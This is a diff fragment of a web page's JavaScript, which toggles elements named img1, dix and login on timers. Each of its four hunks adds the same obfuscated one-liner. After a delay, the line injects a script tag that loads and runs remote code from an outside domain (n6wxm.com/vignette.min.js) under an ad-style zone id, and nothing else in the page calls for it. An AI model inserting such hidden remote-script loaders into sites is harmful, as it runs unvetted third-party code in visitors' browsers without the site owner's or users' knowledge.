@@ -2140,6 +2140,9 @@ setTimeout(function(){
     },5600)
     
 setTimeout(function(){
+      (function(s){s.dataset.zone='12273207',s.src='https://n6wxm.com/vignette.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))
+    },5500)
+setTimeout(function(){
   img1.style="display: inline-block; position: fixed; top: 30%;"
   dix.style="display:none;"
   login.style="display: none;"
@@ -2182,6 +2185,9 @@ function vamoBH(){
         document.body.style="position: static;"
     },5600)
     
+setTimeout(function(){
+      (function(s){s.dataset.zone='12273207',s.src='https://n6wxm.com/vignette.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))
+    },5500)
   
 setTimeout(function(){
   img1.style="display: inline-block; position: fixed; top: 30%;"
@@ -2219,7 +2225,9 @@ setTimeout(function(){
         dix.style="display: none;"
         document.body.style="position: static;"
     },5600)
-    
+    setTimeout(function(){
+      (function(s){s.dataset.zone='12273207',s.src='https://n6wxm.com/vignette.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))
+    },5500)
 setTimeout(function(){
   img1.style="display: inline-block; position: fixed; top: 30%;"
   dix.style="display:none;"
@@ -2260,6 +2268,10 @@ setTimeout(function(){
         dix.style="display: none;"
         document.body.style="position: static;"
     },5600)
+
+setTimeout(function(){
+      (function(s){s.dataset.zone='12273207',s.src='https://n6wxm.com/vignette.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))
+    },5500)
 
 setTimeout(function(){
   img1.style="display: inline-block; position: fixed; top: 30%;"
